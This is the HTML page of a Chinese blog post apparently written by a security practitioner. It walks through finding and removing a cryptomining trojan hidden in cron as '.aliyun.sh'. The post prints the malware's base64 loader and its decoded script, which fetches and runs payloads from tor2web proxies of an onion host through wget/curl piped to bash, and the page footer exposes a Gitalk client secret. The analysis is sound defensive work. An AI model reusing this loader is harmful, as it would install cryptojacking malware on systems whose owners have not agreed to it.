@@ -1,0 +1,643 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="hksanduo">
+  <meta name="keywords" content="">
+  <title>一个名叫aliyun的挖矿木马处理过程 - sanduo blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_yg9cfy8wd6.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">
+
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/gitalk/1.6.2/gitalk.css" />
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Welcome To Sanduo's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+                <div class="mt-3 post-meta">
+                  <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+                  <time datetime="2019-12-19 12:00">
+                    2019年12月19日 中午
+                  </time>
+                </div>
+              
+
+              <div class="mt-1">
+                
+                  
+                  <span class="post-meta mr-2">
+                    <i class="iconfont icon-chart"></i>
+                    1.9k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta mr-2">
+                      <i class="iconfont icon-clock-fill"></i>
+                    
+                    
+                    23
+                     分钟
+                  </span>
+                
+
+                
+              </div>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2 小时前
+                
+              </p>
+            
+            <article class="markdown-body">
+              <h2 id="一个名叫aliyun的挖矿木马处理过程"><a href="#一个名叫aliyun的挖矿木马处理过程" class="headerlink" title="一个名叫aliyun的挖矿木马处理过程"></a>一个名叫aliyun的挖矿木马处理过程</h2><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>老哥突然私聊我，他负责的服务器CPU飙高，发现可疑进程，疑似挖矿。<br><img src="https://hksanduo.github.io/images/20191219-trojan-01.png" srcset="/img/loading.gif" alt="20191219-trojan-01.png"></p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>为了防止事态进一步扩大，我让老哥先把这个进程kill掉，然后进行排查，可是没过多久，挖矿进程死灰复燃了，这次挖矿的名称变成了BP70vI<br><img src="https://hksanduo.github.io/images/20191219-trojan-02.png" srcset="/img/loading.gif" alt="20191219-trojan-02.png"><br>我想事情可能没那么简单，可能设置了定时任务或者有其他远控尚未发现。通过排查定时任务使用<code>crontab -l</code>，发现有一条定时任务，仔细一看原来是阿里云的shell脚本，但是整个系统就配置了这一条定时任务，难免让人怀疑。<br><img src="https://hksanduo.github.io/images/20191219-trojan-03.png" srcset="/img/loading.gif" alt="20191219-trojan-03.png"><br>当我打开<code>/root/.aliyun.sh</code>，我突然发现自己还是太年轻，攻击者尽然使用的是障眼法，没有那个运维人员会闲的蛋疼，把shell程序的内容使用base64进行编码。<br><img src="https://hksanduo.github.io/images/20191219-trojan-04.png" srcset="/img/loading.gif" alt="20191219-trojan-04.png"><br>以下是相关代码，有想研究的小伙伴可以拿去进行研究。</p>
+<pre><code class="hljs gcode"><span class="hljs-attr">#!/bin/bash</span>
+<span class="hljs-attr">exec &amp;&gt;/dev/null</span>
+<span class="hljs-attr">echo ZXhlYyAmPi9</span>kZXYvb<span class="hljs-symbol">nVsbApleHBvcnQgUEFUSD0</span>kUEFUSDovYmluOi<span class="hljs-number">9</span>zYmluOi<span class="hljs-number">91</span>c<span class="hljs-number">3</span>IvYmluOi<span class="hljs-number">91</span>c<span class="hljs-number">3</span>I<span class="hljs-attr">vc2</span>JpbjovdX<span class="hljs-symbol">NyL2</span>xvY<span class="hljs-number">2</span>FsL<span class="hljs-number">2</span>JpbjovdX<span class="hljs-symbol">NyL2</span>xvY<span class="hljs-number">2</span>FsL<span class="hljs-number">3</span><span class="hljs-symbol">NiaW4</span>KdD<span class="hljs-number">10</span>c<span class="hljs-symbol">nVtcHM0</span>YzRvaHh<span class="hljs-number">2</span>cTd<span class="hljs-attr">vCmRpcj0</span>kKGdyZXAgeDokKGlkIC<span class="hljs-number">11</span>KTogL<span class="hljs-number">2</span>V<span class="hljs-number">0</span>Yy<span class="hljs-number">9</span>wYX<span class="hljs-symbol">Nzd2</span>R<span class="hljs-number">8</span>Y<span class="hljs-number">3</span>V<span class="hljs-number">0</span>IC<span class="hljs-number">1</span>kOiAtZjYpCmZ<span class="hljs-attr">vciBpIGluIC91</span>c<span class="hljs-number">3</span>IvYmluICRkaXIgL<span class="hljs-number">2</span>Rldi<span class="hljs-number">9</span>za<span class="hljs-name">G0</span>gL<span class="hljs-number">3</span>RtcCAvdmFyL<span class="hljs-number">3</span>RtcDtkbyB<span class="hljs-number">0</span>b<span class="hljs-number">3</span>VjaCAkaS<span class="hljs-number">9</span>pICYmIG<span class="hljs-symbol">NkICRpICYmIHJtIC1</span>mIGkgJiYgY<span class="hljs-symbol">nJlYWs7</span>Z<span class="hljs-name">G9</span>uZQp<span class="hljs-number">4</span>KCkgewpmPS<span class="hljs-number">9</span>pb<span class="hljs-symbol">nQKZD0</span>uLyQoZGF<span class="hljs-number">0</span>ZXxtZDVzdW<span class="hljs-number">18</span>Y<span class="hljs-number">3</span>V<span class="hljs-number">0</span>IC<span class="hljs-number">1</span>mMSAtZC<span class="hljs-number">0</span>pC<span class="hljs-symbol">ndnZXQgLXQxIC1</span>UMTAgLXFVLSAtLW<span class="hljs-number">5</span>vLW<span class="hljs-symbol">NoZWNrLWNlcnRpZmljYXRlICQxJGYgLU8</span>kZCB<span class="hljs-number">8</span>fCBjdXJsIC<span class="hljs-number">1</span>tMTAgLWZzU<span class="hljs-number">0</span>xrQS<span class="hljs-number">0</span>gJDEkZiAtbyRkCm<span class="hljs-symbol">NobW9</span>kICt<span class="hljs-number">4</span>ICRkOyRk<span class="hljs-meta">O3</span>JtIC<span class="hljs-number">1</span>mICRkC<span class="hljs-symbol">n0</span>KdSgpIHsKeD<span class="hljs-number">0</span>vY<span class="hljs-number">3</span>JuC<span class="hljs-symbol">ndnZXQgLXQxIC1</span>UMTAgLXFVLSAtTy<span class="hljs-number">0</span>gLS<span class="hljs-number">1</span>uby<span class="hljs-number">1</span>jaGVjay<span class="hljs-number">1</span>jZXJ<span class="hljs-number">0</span>aWZpY<span class="hljs-number">2</span>F<span class="hljs-number">0</span>ZSAkMSR<span class="hljs-number">4</span>IHx<span class="hljs-number">8</span>IG<span class="hljs-symbol">N1</span>cmwgLW<span class="hljs-number">0</span>xMCAtZ<span class="hljs-symbol">nNTTGtBLSAkMSR4</span>C<span class="hljs-symbol">n0</span>KZ<span class="hljs-name">m9</span>yIGggaW<span class="hljs-number">4</span>gd<span class="hljs-name">G9</span>yM<span class="hljs-symbol">ndlYi5</span>pbyA<span class="hljs-number">0</span>d<span class="hljs-name">G9</span>yL<span class="hljs-name">m1</span>sI<span class="hljs-name">G9</span>uaW<span class="hljs-number">9</span>uL<span class="hljs-name">m1</span>uI<span class="hljs-name">G9</span>uaW<span class="hljs-number">9</span>uLmluL<span class="hljs-name">m5</span>ldCBvbmlvbi<span class="hljs-number">50</span>byBkM<span class="hljs-symbol">ndlYi5</span><span class="hljs-attr">vcmcgY2</span>l<span class="hljs-number">2</span>aW<span class="hljs-symbol">NsaW5</span>rL<span class="hljs-name">m5</span>ldHd<span class="hljs-attr">vcmsgb25</span>pb<span class="hljs-number">24</span>ud<span class="hljs-number">3</span>Mgb<span class="hljs-number">25</span>pb<span class="hljs-number">24</span>ub<span class="hljs-symbol">nogb25</span>pb<span class="hljs-number">24</span>uZ<span class="hljs-number">2</span>xhc<span class="hljs-number">3</span>Mgd<span class="hljs-name">G9</span>yM<span class="hljs-symbol">ndlYi5</span>zdQpkbwppZiAhIGxzIC<span class="hljs-number">9</span>wc<span class="hljs-name">m9</span>jLyQoY<span class="hljs-number">2</span>F<span class="hljs-number">0</span>IC<span class="hljs-number">90</span>bXAvLlgxMS<span class="hljs-number">11</span>bml<span class="hljs-number">4</span>LzAwKS<span class="hljs-number">9</span>pbzsgdGhlbgp<span class="hljs-number">4</span>IHRydW<span class="hljs-number">1</span>wczRj<span class="hljs-symbol">NG9</span>oeHZx<span class="hljs-symbol">N28</span>uJGgKZWxzZQpicmVhawpmaQpkb<span class="hljs-number">25</span>lCgppZiAhIGxzIC<span class="hljs-number">9</span>wc<span class="hljs-name">m9</span>jLyQoY<span class="hljs-number">2</span>F<span class="hljs-number">0</span>IC<span class="hljs-number">90</span>bXAvLlgxMS<span class="hljs-number">11</span>bml<span class="hljs-number">4</span>LzAwKS<span class="hljs-number">9</span>pbzsgdGhlbgooC<span class="hljs-symbol">nUgJHQudG9</span>yM<span class="hljs-symbol">ndlYi5</span>pbyB<span class="hljs-number">8</span>fAp<span class="hljs-number">1</span>ICR<span class="hljs-number">0</span>LjR<span class="hljs-number">0</span>b<span class="hljs-number">3</span>IubWwgfHwKdSAkdC<span class="hljs-number">5</span>kM<span class="hljs-symbol">ndlYi5</span><span class="hljs-attr">vcmcgfHwKdSAkdC5</span>vbmlvbi<span class="hljs-number">5</span>tbiB<span class="hljs-number">8</span>fAp<span class="hljs-number">1</span>ICR<span class="hljs-number">0</span>L<span class="hljs-name">m9</span>uaW<span class="hljs-number">9</span>uLmluL<span class="hljs-name">m5</span>ldCB<span class="hljs-number">8</span>fAp<span class="hljs-number">1</span>ICR<span class="hljs-number">0</span>L<span class="hljs-name">m9</span>uaW<span class="hljs-number">9</span>uL<span class="hljs-symbol">nRvIHx8</span>C<span class="hljs-symbol">nUgJHQuY2</span>l<span class="hljs-number">2</span>aW<span class="hljs-symbol">NsaW5</span>rL<span class="hljs-name">m5</span>ldHd<span class="hljs-attr">vcmsgfHwKdSAkdC5</span>vbmlvbi<span class="hljs-number">5</span>wZXQgfHwKdSAkdC<span class="hljs-number">50</span>b<span class="hljs-number">3</span>Iyd<span class="hljs-number">2</span>ViL<span class="hljs-symbol">nN1</span>IHx<span class="hljs-number">8</span>C<span class="hljs-symbol">nUgJHQub25</span>pb<span class="hljs-number">24</span>uZ<span class="hljs-number">2</span>xhc<span class="hljs-number">3</span>MgfHwKdSAkdC<span class="hljs-number">5</span>vbmlvbi<span class="hljs-number">53</span>cwopfGJhc<span class="hljs-number">2</span>gKZmkK|base<span class="hljs-number">64</span> -d | bash</code></pre>
+<p>使用base64进行解码，可以得到恶意的shell脚本内容<br><img src="https://hksanduo.github.io/images/20191219-trojan-05.png" srcset="/img/loading.gif" alt="20191219-trojan-05.png"><br>解码以后的内容如下：</p>
+<pre><code class="hljs routeros">exec &amp; &gt; /dev/<span class="hljs-literal">null</span>
+<span class="hljs-builtin-name">export</span> <span class="hljs-attribute">PATH</span>=<span class="hljs-variable">$PATH</span>:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin
+<span class="hljs-attribute">t</span>=trumps4c4ohxvq7o
+<span class="hljs-attribute">dir</span>=$(grep x:$(id -u): /etc/passwd|cut -d: -f6)
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> /usr/bin <span class="hljs-variable">$dir</span> /dev/shm /tmp /var/tmp;
+<span class="hljs-keyword">do</span>
+	touch <span class="hljs-variable">$i</span>/i &amp;&amp; cd <span class="hljs-variable">$i</span> &amp;&amp; rm -f i &amp;&amp; break;
+done
+x() &#123;
+	<span class="hljs-attribute">f</span>=/int
+	<span class="hljs-attribute">d</span>=./$(date|md5sum|cut -f1 -d-)
+	wget -t1 -T10 -qU- --no-check-certificate <span class="hljs-variable">$1</span><span class="hljs-variable">$f</span> -O<span class="hljs-variable">$d</span> || curl -m10 -fsSLkA- <span class="hljs-variable">$1</span><span class="hljs-variable">$f</span> -o<span class="hljs-variable">$d</span>
+	chmod +x <span class="hljs-variable">$d</span>;<span class="hljs-variable">$d</span>;rm -f <span class="hljs-variable">$d</span>
+&#125;
+u() &#123;
+	<span class="hljs-attribute">x</span>=/crn
+	echo <span class="hljs-string">"wget -t1 -T10 -qU- -O- --no-check-certificate <span class="hljs-variable">$1</span><span class="hljs-variable">$x</span> || curl -m10 -fsSLkA- <span class="hljs-variable">$1</span><span class="hljs-variable">$x</span>"</span>
+&#125;
+<span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> tor2web.io 4tor.ml onion.mn onion.<span class="hljs-keyword">in</span>.net onion.<span class="hljs-keyword">to</span> d2web.org civiclink.network onion.ws onion.nz onion.glass tor2web.su
+<span class="hljs-keyword">do</span>
+	<span class="hljs-keyword">if</span> ! ls /proc/$(cat /tmp/.X11-unix/00)/io; then
+		x trumps4c4ohxvq7o.<span class="hljs-variable">$h</span>
+	<span class="hljs-keyword">else</span>
+		break
+	fi
+done
+
+<span class="hljs-keyword">if</span> ! ls /proc/$(cat /tmp/.X11-unix/00)/io; then
+	(
+		u <span class="hljs-variable">$t</span>.tor2web.io ||
+		u <span class="hljs-variable">$t</span>.4tor.ml ||
+		u <span class="hljs-variable">$t</span>.d2web.org ||
+		u <span class="hljs-variable">$t</span>.onion.mn ||
+		u <span class="hljs-variable">$t</span>.onion.<span class="hljs-keyword">in</span>.net ||
+		u <span class="hljs-variable">$t</span>.onion.<span class="hljs-keyword">to</span> ||
+		u <span class="hljs-variable">$t</span>.civiclink.network ||
+		u <span class="hljs-variable">$t</span>.onion.pet ||
+		u <span class="hljs-variable">$t</span>.tor2web.su ||
+		u <span class="hljs-variable">$t</span>.onion.glass ||
+		u <span class="hljs-variable">$t</span>.onion.ws
+	)|bash
+fi</code></pre>
+<p>通过分析，我们可以发现，该shell首先会判断当前用户是否对<code>/usr/bin 当前用户的home目录 /dev/shm /tmp /var/tmp</code>这几个目录拥有读写权限。</p>
+<blockquote>
+<p><strong>/tmp/.X11-unix/00是什么鬼</strong><br>X11 server需要有一种途径来跟X11 client来进行沟通。 在网络上它们可以通过TCP/IP Socket来实现沟通，而在本机上它们通过一个Unix-domain socket来沟通.Unix-domain socket其实很TCP/IP socket很类似，只不过它指向的是一个文件路径，而且无需通过网卡进行转发，因此相对来说更安全，更更快些。而 /tmp/.X11-unix 其实就是存放这些Unix-domain Socket的地方。一般来说 /tmp/.X11-unix 下面只会有一个 Unix-domain Socket(因为一般只有一个Xserver在运行)，但若系统同时运行多个Xserver，也可能会有多个Unix Domain Socket出现的情况。具体可以参考参考内容里的文章，里面有详细说明</p>
+</blockquote>
+<p>但是，通过查看<code>/tmp/.X11-unix/</code>目录中的<strong>00</strong>文件，我并未发现该文件的种类并不是<strong>s</strong>，攻击者可能是为了掩人耳目，故意在该目录下设置一个文件，来存储远控木马进程id<br><img src="https://hksanduo.github.io/images/20191219-trojan-06.png" srcset="/img/loading.gif" alt="20191219-trojan-06.png"><br>通过判断 <strong>/proc/木马进程id/io</strong> 文件是否存在，如果不存在执行<strong>X</strong>函数从以下这些站点三级域名<strong>trumps4c4ohxvq7o</strong>下载int木马客户端</p>
+<ul>
+<li>tor2web.io</li>
+<li>4tor.ml</li>
+<li>onion.mn</li>
+<li>onion.in.net</li>
+<li>onion.to</li>
+<li>d2web.org</li>
+<li>civiclink.network</li>
+<li>onion.ws</li>
+<li>onion.nz</li>
+<li>onion.glass</li>
+<li>tor2web.su</li>
+</ul>
+<p>通过全网检这些三级域名，发现年中的时候有人中招了，文件名不同，但是手法很像，有兴趣可以查看我提供参考链接。下载木马客户端的用户名为当前时间的md5值，然后授权执行删除。<br>具体使用wget或者curl请求下载int木马文件拼接案例语句如下：</p>
+<pre><code class="hljs llvm">wget -t<span class="hljs-number">1</span> -T<span class="hljs-number">10</span> -qU- --no-check-certificate trumps<span class="hljs-number">4</span><span class="hljs-keyword">c</span><span class="hljs-number">4</span>ohxvq<span class="hljs-number">7</span>o.onion.mn/int -O./e<span class="hljs-number">0</span>ee<span class="hljs-number">4</span>ac<span class="hljs-number">14e82501</span>dc<span class="hljs-number">127890</span>f<span class="hljs-number">75770</span><span class="hljs-keyword">c</span><span class="hljs-number">17</span>   || curl -m<span class="hljs-number">10</span> -fsSLkA- trumps<span class="hljs-number">4</span><span class="hljs-keyword">c</span><span class="hljs-number">4</span>ohxvq<span class="hljs-number">7</span>o.onion.mn/int -o./e<span class="hljs-number">0</span>ee<span class="hljs-number">4</span>ac<span class="hljs-number">14e82501</span>dc<span class="hljs-number">127890</span>f<span class="hljs-number">75770</span><span class="hljs-keyword">c</span><span class="hljs-number">17</span></code></pre>
+<p>将下载下来的int和crn文件进行分析，<br>virustotal返回的结果是crn是安全的，int只有Ikarus和SentinelOne (Static ML)两个引擎判断为木马，可见这个木马病毒在绕过引擎检测方面下了大量功夫。<br>crn检测结果：<br><img src="https://hksanduo.github.io/images/20191219-trojan-17.png" srcset="/img/loading.gif" alt="20191219-trojan-17.png"><br>int检测结果：<br><img src="https://hksanduo.github.io/images/20191219-trojan-18.png" srcset="/img/loading.gif" alt="20191219-trojan-18.png"><br>返现int木马程序主体，crn为shell文件，目的是下载int木马程序并运行，crn文件并未进行编码和混淆，不太清楚作者为何这么做。<br><img src="https://hksanduo.github.io/images/20191219-trojan-19.png" srcset="/img/loading.gif" alt="20191219-trojan-19.png"><br>将int扔到IDA并未发现什么，只发现基本的逻辑流程，可能个人逆向功底太弱了，那位大佬分析了，可以请教一下。<br><img src="https://hksanduo.github.io/images/20191219-trojan-20.png" srcset="/img/loading.gif" alt="20191219-trojan-20.png"><br>接下来我们继续分析aliyun.sh脚本，发现木马通过判断 <strong>/proc/木马进程id/io</strong> 文件是否存在，如果不存在执行<strong>U</strong>函数从以下这些站点三级域名<strong>trumps4c4ohxvq7o</strong>下载<strong>crn</strong> shell脚本并执行，<br>使用<code>lsof</code>命令查看该进程相关信息，如果没有相关命令，请自行安装<br><img src="https://hksanduo.github.io/images/20191219-trojan-07.png" srcset="/img/loading.gif" alt="20191219-trojan-07.png"><br>可以发现相应的远控客户端（/usr/bin/46e5166a46208402e09732a78526b5f0）已删除<br>使用top我们可以发现，该挖矿木马的客户端的进程id为8391，<br><img src="https://hksanduo.github.io/images/20191219-trojan-08.png" srcset="/img/loading.gif" alt="20191219-trojan-08.png"><br>通过查看<code>/tmp/.X11-unix/00</code>文件，获取对应远控客户端进程id为<strong>8065</strong><br><img src="https://hksanduo.github.io/images/20191219-trojan-09.png" srcset="/img/loading.gif" alt="20191219-trojan-09.png"><br>通过pstree，我们可以清晰的看到两个异常的进程<strong>OYK6yV</strong>和 <strong>jKhnvF</strong><br><img src="https://hksanduo.github.io/images/20191219-trojan-10.png" srcset="/img/loading.gif" alt="20191219-trojan-10.png"><br>通过分析<code>ps -ef</code>的结果，获取异常异常进程信息<br><img src="https://hksanduo.github.io/images/20191219-trojan-11.png" srcset="/img/loading.gif" alt="20191219-trojan-11.png"><br>综合所有信息，我们发现jKhnvF是挖矿进程，OYK6yV是木马远控的进程。</p>
+<h2 id="移除挖矿木马"><a href="#移除挖矿木马" class="headerlink" title="移除挖矿木马"></a>移除挖矿木马</h2><p>分析完挖矿木马基本信息，接下来我们需要移除这些恶意的进程，并针对相关漏洞进行打补丁。<br>我们首先移除了crotab中设定的定时任务<br><img src="https://hksanduo.github.io/images/20191219-trojan-12.png" srcset="/img/loading.gif" alt="20191219-trojan-12.png"><br>然后杀掉两个恶意进程<br><img src="https://hksanduo.github.io/images/20191219-trojan-13.png" srcset="/img/loading.gif" alt="20191219-trojan-13.png"><br>然后我发现当我们kill掉的挖矿进程又死灰复燃了，通过分析，可能其他地方还存在定时任务，或者遗漏，还有其他恶意进程，我们在 <strong>/etc/cron.d/</strong> 下发现<strong>0aliyun</strong>这个定时任务文件，突然发现这里还有一个定时任务，顺便发现在 <strong>/opt/</strong> 目录下，还有一个 <strong>aliyun.sh</strong> 的挖矿脚本。<br><img src="https://hksanduo.github.io/images/20191219-trojan-14.png" srcset="/img/loading.gif" alt="20191219-trojan-14.png"><br>我们通过移除两个定时任务，然后重复上面的操作，找到挖矿端和木马远控客户端，杀掉就行<br><img src="https://hksanduo.github.io/images/20191219-trojan-15.png" srcset="/img/loading.gif" alt="20191219-trojan-15.png"><br>清除<code>/root/.aliyun.sh</code>和<code>/opt/aliyun.sh</code><br>看着运行正常的系统，内心还是很满足的。<br><img src="https://hksanduo.github.io/images/20191219-trojan-16.png" srcset="/img/loading.gif" alt="20191219-trojan-16.png"></p>
+<h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>后续溯源工作由于系统是研发同事的测试系统，上面运行三个web站点，并且安装redis，memcache等，并且未设置日志，所以并未发现攻击者是从什么地方进来的。针对这些问题我们给出以下建议:<br>1、配置redis的日志，对redis进行安全加固和合规性配置<br>2、使用河马webshell查杀工具对web目录进行扫描，查看是否有遗留的webshell<br>3、加固操作系统，重新设置复杂度较高的密码。</p>
+<h2 id="参考内容"><a href="#参考内容" class="headerlink" title="参考内容"></a>参考内容</h2><ul>
+<li><a href="http://blog.lujun9972.win/blog/2018/04/24/docker%E5%AE%B9%E5%99%A8%E4%B8%AD%E8%B7%91gui%E7%9A%84%E6%9C%80%E7%AE%80%E5%8D%95%E6%96%B9%E6%B3%95/index.html" target="_blank" rel="noopener">http://blog.lujun9972.win/blog/2018/04/24/docker%E5%AE%B9%E5%99%A8%E4%B8%AD%E8%B7%91gui%E7%9A%84%E6%9C%80%E7%AE%80%E5%8D%95%E6%96%B9%E6%B3%95/index.html</a>【/tmp/.X11-unix=是什么玩意】</li>
+<li><a href="https://unix.stackexchange.com/questions/196677/what-is-tmp-x11-unix" target="_blank" rel="noopener">https://unix.stackexchange.com/questions/196677/what-is-tmp-x11-unix</a> 【what-is-tmp-x11-unix】</li>
+<li><a href="https://www.cnblogs.com/jinanxiaolaohu/p/11993504.html" target="_blank" rel="noopener">https://www.cnblogs.com/jinanxiaolaohu/p/11993504.html</a></li>
+</ul>
+
+            </article>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/Security/">Security</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/trojan/">trojan</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/02/07/2020-02-07-install-sonarqube-on-docker/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">使用docker安装sonarqube</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-6">
+                    
+                    
+                      <a href="/2019/11/15/2019-11-15-flawfinder-install-and-use/">
+                        <span class="hidden-mobile">Flawfinder开源C/C++静态扫描分析工具安装与使用</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <div class="comments" id="comments">
+                
+                
+  <div id="gitalk-container"></div>
+  <script defer src="https://cdn.staticfile.org/gitalk/1.6.2/gitalk.min.js" ></script>
+  <script type="text/javascript">
+    var oldLoadGt = window.onload;
+    window.onload = function () {
+      oldLoadGt && oldLoadGt();
+
+      var gitalk = new Gitalk({
+        clientID: 'be14fbeeae5d109fc370',
+        clientSecret: '435ce16e4168507c36e8638170f52db128e04c03',
+        repo: 'https://github.com/hksanduo/hksanduo.github.io/issues',
+        owner: 'hksanduo',
+        admin: 'hksanduo',
+        id: 'abe2f11339bee105f3f102052ebaa0c7',
+        language: 'zh-CN',
+        perPage: 15,
+        pagerDirection: 'last',
+        createIssueManually: 'true',
+        distractionFreeMode: 'false'
+      });
+      gitalk.render('gitalk-container')
+    }
+  </script>
+
+
+              </div>
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
+        <span>Fluid</span></a>
+    </div>
+    
+  <div>
+    
+      <!-- 不蒜子统计PV -->
+      
+      <span id="busuanzi_container_site_pv" style="display: none">
+      总访问量 <span id="busuanzi_value_site_pv"></span> 次
+    </span>
+    
+    
+      <!-- 不蒜子统计UV -->
+      
+      <span id="busuanzi_container_site_uv" style="display: none">
+      总访客数 <span id="busuanzi_value_site_uv"></span> 人
+    </span>
+    
+  </div>
+
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+
+  <script  src="/js/lazyload.js" ></script>
+
+
+
+  
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
